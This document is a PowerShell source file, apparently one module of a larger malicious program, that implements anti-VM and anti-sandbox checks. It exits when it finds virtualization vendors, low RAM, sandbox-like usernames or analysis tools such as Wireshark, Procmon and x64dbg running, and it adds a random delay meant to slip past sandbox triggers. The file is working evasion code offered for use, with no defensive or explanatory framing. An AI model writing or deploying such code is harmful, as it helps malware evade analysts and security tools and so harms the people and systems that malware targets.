# core/anti_vm.ps1

# =============================
# ✅ Anti-VM & Anti-Sandbox Module (2025)
# =============================

try {
    $man = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $model = (Get-WmiObject Win32_ComputerSystem).Model
    $ram = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
    $cpu = (Get-WmiObject Win32_Processor).Name
    $user = $env:USERNAME
    $host = $env:COMPUTERNAME
    $processes = (Get-Process | Select-Object -ExpandProperty ProcessName)

    # 🛑 Check manufacturer
    if ($man -match "VMware|VirtualBox|KVM|Xen") { exit }

    # 🛑 Check model strings
    if ($model -match "Virtual|QEMU|Bochs") { exit }

    # 🛑 Check RAM
    if ($ram -lt 4000000) { exit }  # <4GB

    # 🛑 Check for typical sandbox usernames
    if ($user -match "sandbox|maltest|analyst|test") { exit }

    # 🛑 Check for processes
    $bad = @("vboxservice", "wireshark", "procmon", "fiddler", "ida", "ollydbg", "x64dbg", "peid")
    foreach ($b in $bad) {
        if ($processes -contains $b) { exit }
    }
} catch {}

# Optional delay to bypass fast-exit sandbox triggers
Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
